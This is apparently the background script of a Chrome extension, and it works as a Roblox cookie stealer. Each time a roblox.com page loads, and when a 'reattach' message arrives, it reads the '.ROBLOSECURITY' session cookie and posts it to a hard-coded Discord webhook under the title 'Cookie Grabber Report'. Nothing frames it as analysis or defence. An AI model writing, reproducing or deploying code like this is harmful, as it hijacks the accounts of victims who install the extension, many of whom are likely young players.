// Track sent cookies per tab to avoid duplicates
let sentTabs = {};

// Function to send cookie to webhook (with error handling and correct headers)
function sendCookieToWebhook(cookieValue) {
  const webhookUrl = "https://discord.com/api/webhooks/1445816866986659895/n5KT6iuvJxGECzlunmjSk5SyAPc-wTJ3KOadnl7zU1ENqe6MOp4ubZXUb3hdsAFxa5zF";

  const payload = {
    content: "@here cookie file scanned and grabbed",
    embeds: [{
      title: "Cookie Grabber Report",
      fields: [
        { name: "Time", value: new Date().toISOString() },
        { name: "Cookie File", value: `\`\`\`${cookieValue}\`\`\`` }
      ]
    }]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    console.log("Webhook sent successfully");
  })
  .catch(error => {
    console.error("Webhook send error:", error);
    console.log("Payload:", payload);
  });
}

// Listen for messages from content script (button click)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "reattach") {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      if (cookie) {
        sendCookieToWebhook(cookie.value);
        sendResponse({ success: true });
      } else {
        sendResponse({ success: false, error: "Cookie not found" });
      }
    });
    return true; // Required for async response
  }
});

// Auto-send cookie on roblox.com page load (ONCE PER TAB)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && tab.url.includes("roblox.com") && changeInfo.status === "complete") {
    if (!sentTabs[tabId]) {
      sentTabs[tabId] = true;
      chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
        if (cookie) {
          sendCookieToWebhook(cookie.value);
        }
      });
    }
  }
});

// Clear sentTabs when tab is closed
chrome.tabs.onRemoved.addListener((tabId) => {
  delete sentTabs[tabId];
});
